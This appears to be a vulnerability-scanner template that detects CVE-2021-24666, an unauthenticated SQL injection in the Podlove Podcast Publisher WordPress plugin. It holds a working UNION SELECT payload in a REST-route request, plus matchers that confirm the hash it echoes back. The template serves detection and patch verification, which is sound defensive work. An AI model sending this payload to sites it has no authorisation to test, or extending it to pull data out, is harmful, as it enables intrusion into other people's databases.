id: CVE-2021-24666

info:
  name: Podlove Podcast Publisher < 3.5.6 - SQL Injection
  author: theamanrawat
  severity: critical
  description: |
    The Podlove Podcast Publisher WordPress plugin before 3.5.6 contains a 'Social & Donations' module (not activated by default), which adds the rest route '/services/contributor/(?P<id>[\d]+), takes an 'id' and 'category' parameters as arguments. Both parameters can be used for the SQLi.
  remediation: Fixed in version 3.5.6
  reference:
    - https://wpscan.com/vulnerability/fb4d7988-60ff-4862-96a1-80b1866336fe
    - https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24666
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24666
    cwe-id: CWE-89
  metadata:
    verified: "true"
  tags: cve,cve2021,sqli,wordpress,wp-plugin,wp,podlove-podcasting-plugin-for-wordpress

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('CVE-2021-24666'),NULL,NULL,NULL--%20-"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '66a82937a7660b73b00d4f7cefee6c85'
          - '"service_id"'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
